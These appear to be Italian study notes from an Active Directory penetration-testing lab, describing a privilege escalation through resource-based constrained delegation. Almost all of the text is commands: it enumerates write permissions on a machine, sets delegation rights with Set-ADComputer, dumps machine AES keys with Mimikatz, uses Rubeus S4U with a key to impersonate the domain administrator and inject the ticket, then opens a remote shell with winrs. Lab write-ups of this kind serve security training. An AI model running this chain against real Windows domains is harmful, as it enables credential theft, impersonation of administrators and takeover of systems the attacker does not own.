# Priv Esc - Resource-based Constrained Delegation3

* Abbiamo gia privilegi admi sulla student VM che una macchina joinata a dominio
* L'enumerazione mostra che l'utente ciadmin ha Write Permissions sulla macchina dccorp-mgmt

```powershell
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
```

* Utilizzando il modulo Active Directory e' possibilie configurare RBCD per le studentVM

```powershell
$comps = 'dcorp-student1$','dcorp-student2$' 
Set-ADComputer -Identity dcorp-mgmt -PrincipalsAllowedToDelegateToAccount $comps
```

* Otteniamo i privilegi della macchina dcorp-studentx$ estrando la chiavi AES

```powershell
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

* Utilizzare l'AES key della macchina precedente con Rubeus e accedere alla dcorp-mgmt come qualsiasi utente noi vogliamo

```powershell
Rubeus.exe s4u /user:dcorp-student1$
/aes256:d1027fbaf7faad598aaeff08989387592c0d8e0201ba453d
83b9e6b7fc7897c2 /msdsspn:http/dcorp-mgmt
/impersonateuser:administrator /ptt
```

```powershell
winrs -r:dcorp-mgmt cmd.exe
```
